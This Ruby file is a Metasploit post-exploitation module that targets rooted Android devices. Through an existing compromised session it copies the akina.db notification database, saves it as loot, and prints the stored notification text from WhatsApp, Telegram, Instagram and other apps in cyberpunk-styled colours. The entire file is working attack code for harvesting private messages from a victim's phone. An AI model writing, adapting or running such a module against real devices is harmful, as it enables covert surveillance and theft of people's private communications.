# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'sqlite3'
require 'fileutils'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Android::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        {
          'Name' => 'Android Gather Akina Notifications - Cyberpunk Edition',
          'Description' => %q{
            Post Module to gather notification data from akina.db. Root is required.
            This module retrieves notifications stored in the akina.db database.
            Styled for a cyberpunk aesthetic.
          },
          'License' => MSF_LICENSE,
          'Author' => ['Nous'],
          'SessionTypes' => [ 'meterpreter', 'shell' ],
          'Platform' => 'android'
        }
      )
    )
  end

  def cyberpunk_text(text, color_code)
    "\e[#{color_code}m#{text}\e[0m"
  end

  def display_logo
    logo = <<~LOGO
      \e[1;35m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠴⠒⠒⠒⠒⠢⠤⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣠⠞⠁⠀⠚⠋⢀⣠⡤⠤⠤⢤⣟⠲⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⢀⡞⢩⡖⠛⡾⠁⠀⠀⠀⡠⠊⠁⠀⠀⢰⣶⣶⡄⠙⢮⡙⢗⡄⠀⠀⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⢸⡅⢻⡀⡼⠁⠀⠀⠀⡜⠀⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠻⡈⡇⠀⠀⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⠀⠳⣄⠉⠁⠀⠀⠀⢸⠁⠀⣀⠤⠖⠊⠉⠉⠉⠉⠒⢦⡀⠃⢸⡀⠀⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⢸⡴⠋⠀⠀⢀⠀⠀⠀⠀⡀⠀⠀⠙⢿⡀⢣⠀⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⢀⡼⠁⠀⢠⡇⠀⣿⠛⢿⡄⠀⣇⣆⠀⡆⠀⢹⣼⡄⠀⠀⠀⠀coded by nous
      \e[1;35m⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⣸⠃⢢⣷⣸⡇⣀⢿⠀⢸⣇⡀⣹⣼⡀⠰⠀⢘⣿⡇⠀⠀⠀⠀17/02/2022
      \e[1;35m⠀⠀⠀⠀⠀⠀⢸⡇⠀⢀⡏⢀⠾⠴⢟⡛⣟⠛⠀⣸⠙⠈⣷⡟⠺⢿⣾⠾⣿⠁⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⠀⠀⢸⠃⠀⢸⢳⢾⡀⠰⣹⣿⠏⠀⠀⠀⠀⠀⢻⣿⣷⢬⣿⣴⠿⠀⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⠀⠀⡜⠀⠀⡞⠻⡇⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⠉⣼⠏⠙⡄⠀⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⠀⢰⠃⢀⣼⣆⠀⣙⣦⠀⠀⠀⠀⠀⠀⠤⠀⠀⠀⠀⣰⢻⠀⠀⣿⠀⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⢀⡇⢀⠎⠘⠀⠑⠏⠋⠙⢤⡀⠀⠀⠠⠦⠀⢀⡤⢾⠃⢸⠀⠀⠰⣇⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⠘⣇⡇⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢶⣶⣶⠚⠉⠀⢸⠀⢠⠀⠀⠀⠙⣆⠀⠀⠀
      \e[1;35m⠀⠀⠀⢀⡾⠛⡇⠀⠀⠀⠀⠀⠀⠀⣠⠔⠊⢁⣿⣿⠓⠠⣄⡈⡀⢸⠀⠀⠀⠀⢸⠀⠀⠀
      \e[1;35m⠀⠀⢀⡞⠁⠀⠘⠢⡀⠀⠀⣠⡔⠋⠀⡠⠀⢸⠉⠁⠀⠠⠀⠉⠃⢸⠀⠀⢀⣴⡁⠀⠀⠀
      \e[1;35m⠀⠀⡼⠀⠀⠀⠀⠘⠈⠁⠉⠉⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠐⠄⡇⢸⠉⠉⠁⠀⢱⡄⠀⠀
      \e[1;35m⠀⣼⠁⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⢠⢦⠀⠀⠀⣧⠃⠀⠀⠀⠇⠀⢳⠀⠀
      \e[1;35m⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠘⠛⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⢸⡇⠀
      \e[1;35m ⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠈⡇⠀
      \e[1;35m ⢸⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀
      \e[1;35m ⠈⡆⠀⠀⠀⠀⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡇
      \e[1;35m         ░  ░░   ░           ░       ░  ░
      \e[0m
    LOGO
    print_line(logo)
    print_status(cyberpunk_text(":: Akina DB Extraction Module ::", '36'))
  end

  def read_store_sql(location)
    db_loot_name = ''
    file_name = File.basename(location)
    ['', '-wal', '-shm'].each do |ext|
      l = location + ext
      next unless file_exist?(l)

      f = file_name + ext
      data = read_file(l)
      if data.blank?
        print_error("Unable to read #{l}")
        return
      end
      print_good("Saved #{f} with length #{data.length}")

      if ext == ''
        loot_file = store_loot('SQLite3 DB', 'application/x-sqlite3', session, data, f, 'Android database')
        db_loot_name = loot_file
        next
      end

      loot_file = store_loot('SQLite3 DB', 'application/binary', session, data, f, 'Android database')
      new_name = "#{db_loot_name}#{ext}"
      FileUtils.mv(loot_file, new_name)
    end
    SQLite3::Database.new(db_loot_name)
  end

  def extract_notifications(db)
    begin
      results = db.execute("SELECT app_name, notification_text FROM notification_table")
      results.each do |row|
        app, msg = row
        color = case app.downcase
              when /whatsapp/ then '32'  # Verde
              when /telegram/ then '34'  # Azul
              when /instagram/ then '35' # Roxo
              when /facebook/ then '94'  # Azul claro
              when /twitter|x/ then '36' # Ciano
              when /discord/ then '96'   # Azul neon
              when /tiktok/ then '91'    # Vermelho neon
              when /snapchat/ then '33'  # Amarelo
              when /youtube/ then '31'   # Vermelho
              else '37' # Branco para outros
              end
        print_good(cyberpunk_text("[#{app}] -> #{msg}", color))
      end
    rescue SQLite3::SQLException => e
      print_error("Failed to query notifications: #{e.message}")
    end
  end
  
  def run
    display_logo

    db_path = '/data/user/0/com.capture/databases/akina.db'
    unless file_exist?(db_path)
      print_error("Database file #{db_path} does not exist.")
      return
    end

    db = read_store_sql(db_path)
    if db.nil?
      print_error("Unable to read #{db_path}")
      return
    end

    print_status(cyberpunk_text("Extracting notifications...", '33')) # Amarelo
    extract_notifications(db)
  end
end
